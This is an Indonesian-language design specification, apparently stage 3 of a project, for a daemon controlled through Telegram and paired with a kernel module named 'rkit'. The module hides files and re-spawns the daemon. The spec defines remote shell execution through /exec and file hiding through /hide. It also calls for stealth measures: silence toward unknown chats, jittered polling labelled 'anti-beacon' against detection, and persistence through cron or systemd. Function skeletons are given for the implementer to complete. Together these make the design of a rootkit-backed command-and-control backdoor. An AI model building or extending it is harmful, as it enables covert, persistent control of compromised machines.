# SPEC — Format Perintah + Struktur Daemon (Tahap 3)

##0. Prinsip

1. **Otorisasi dulu, eksekusi kemudian** — semua perintah hanya dijalankan
   berasal dari `TELEGRAM_CHAT_ID` yang cocok. Dari chat lain → **diam total**
   (jangan dibalas, jangan memberi tahu keberadaan).
2. Daemon = **userland biasa**; modul kernel hanya untuk hide + re-spawn.
3. Token dibaca dari `config.ini` — tidak pernah ada di kode, tidak pernah di-log.
4. Token masih placeholder (`LETAKKAN TOKEN...`) → daemon **exit dengan pesan jelas**.

---

##1. Format perintah

Grammar: `/perintah [argumen]` — teks tanpa `/` diabaikan.

| Perintah | Argumen | Butuh modul? | Aksi | Balasan sukses | Balasan gagal |
|---|---|:-:|---|---|---|
| `/help` | — | ❌ | daftar perintah | `✅ perintah: /status /exec /hide /show /sleep /uninstall /help` | — |
| `/status` | — | ❌ | info host | `✅ host=… kernel=… backend=… uptime=… uid=…` | — |
| `/exec` | `<cmdline>` | ❌ | jalankan via shell, **timeout 10 dtk** | balasan dalam blok kode, **potong 4000 char** | `❌ exit=N` + stderr (potong juga) |
| `/hide` | `<nama>` | ✅ | panggil binary CLI lokal | `✅ <nama> disembunyikan` + bukti | `❌ modul tidak aktif` |
| `/show` | `<nama>` | ✅ | balikan hide (via CLI) | `✅ <nama> ditampilkan` | `❌ …` |
| `/sleep` | `[detik]` | ❌ | jeda polling sementara | `✅ tidur N dtk` | — |
| `/uninstall` | — | ❌ | berhenti + hapus auto-start diri | `✅ daemon berhenti` | — |

**Bungkus balasan (envelope):**
```
<emoji> <pesan singkat>
<output apa adanya, atau dalam balikan sederhana>
```
- Output dipotong pada 4000 char → tambah `… [+N char lagi]`
- stdout+stderr digabung; timeout → `❌ timeout setelah 10 dtk`

**Rate limit:** minimal 2 detik antar `/exec`; maks 10 `/exec` per menit.

---

##2. Struktur kode daemon

```
control/telegram/
├── daemon.py      ← loop utama + otorisasi + transport
├── commands.py    ← handler per perintah (murni fungsi, mudah diuji)
└── README.md      ← cara isi token, jalankan, uji
```

**daemon.py — peta fungsi (isi badannya sendiri):**

```python
# state: offset (ingat posisi polling), last_exec_ts (rate limit), sleep_until

def load_config(path="config.ini") -> Config
    """baca token/chat_id/interval; exit kalau token masih placeholder"""

def authorize(update, cfg) -> bool
    """True hanya kalau chat_id pengirim == cfg.chat_id. DIPANGGIL
       DI AWAL dispatch — tidak ada jalur eksekusi yang melewati ini"""

def send_msg(token, chat_id, text) -> None
    """sendMessage via HTTPS; timeout network selalu30 dtk;
       jangan pernah mencetak token ke log"""

def poll_updates(token, offset) -> list[Update]
    """getUpdates?offset=…&timeout=25; balik daftar update"""

def dispatch(update, cfg, ctx) -> str
    """cek authorize → parse '/cmd args' → route ke commands.cmd_*;
       bungkus hasil ke envelope; tangkap SEMUA exception → '❌ internal'"""

def main():
    cfg = load_config()
    send_msg(cfg.token, cfg.chat_id, "✅ online | host=… | kernel=…")
    offset = 0
    while True:
        sleep(jitter(cfg.poll_interval, cfg.rand_jitter))   # acak!
        for u in poll_updates(cfg.token, offset):
            offset = u.update_id + 1
            if not authorize(u, cfg):     # ← GERBANG KEAMANAN
                continue                  #   diam, jangan dibalas
            reply = dispatch(u, cfg, ctx)
            send_msg(cfg.token, cfg.chat_id, reply)
```

**commands.py — kontrak fungsi:**

```python
def cmd_status(ctx) -> str                 # uname, uptime, uid, backend terdeteksi
def cmd_exec(ctx, cmdline: str) -> str     # jalankan via shell, timeout 10 dtk,
                                           # output digabung + dipotong 4000
                                           # (implementasi: subprocess, kamu tulis)
def cmd_hide(ctx, name: str) -> str        # panggil binari CLI (lihat kontrak §3)
def cmd_show(ctx, name: str) -> str
def cmd_sleep(ctx, detik: int) -> str
def cmd_uninstall(ctx) -> str
def cmd_help() -> str
```

---

##3. Kontrak dengan tahap 2 (modul kernel)

Daemon **tidak** bicara langsung ke modul — selalu lewat binary CLI:

```
control/cli/bin/rkit hide file <nama>   → exit0 = sukses, exit1 = gagal
control/cli/bin/rkit show file <nama>   → idem
control/cli/bin/rkit status             → stdout: aktif/tidaknya modul
```

`cmd_hide` cukup memanggil binari itu dan membungkus exit-code-nya.

---

##4. Checklist keamanan (wajib lolos sebelum rilis)

- [ ] `authorize()` dipanggil **sebelum** dispatch — audit: tidak ada
      jalankode `/exec` yang bisa dicapai tanpa cek chat_id
- [ ] Token tidak pernah di-print/di-log/di-encode ke pesan
- [ ] `config.ini` → chmod 600 + sudah masuk `.gitignore` ✅
- [ ] Placeholder token → daemon berhenti, bukan coba connect
- [ ] Timeout di semua panggilan luar (network30 dtk, exec10 dtk)
- [ ] Polling pakai `POLL_INTERVAL + RAND_JITTER` (anti-beacon, lihat DETECTION.md)
- [ ] `/uninstall` benar-benar membersihkan auto-start diri

##5. Urutan implementasi & uji (di VM)

1. `daemon.py` skeleton + `load_config` + `/help` `/status` → **bisa diuji tanpa modul**
2. `/exec` + `authorize` + rate-limit → uji: kirim dari chat ID lain (harus DIAM)
3. `/hide` `/show` → setelah tahap2 (modul) jadi
4. Auto-start (cron `@reboot` atau systemd --user) + re-spawn oleh modul → uji reboot
